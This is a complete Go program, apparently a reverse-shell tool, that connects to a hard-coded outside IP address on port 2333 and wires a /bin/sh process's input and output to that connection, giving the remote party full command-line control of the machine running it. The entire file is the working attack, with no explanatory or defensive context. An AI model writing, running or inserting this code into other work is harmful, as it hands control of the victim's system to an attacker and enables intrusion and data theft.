package main

import (
	"net"
	"os"
	"os/exec"
)

func main() {
	conn, err := net.Dial("tcp", "115.159.115.41:2333")
	if err != nil {
		os.Exit(1)
	}

	//cmd := exec.Command("/usr/bin/python")
	cmd := exec.Command("/bin/sh")

	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn

	cmd.Run()
}
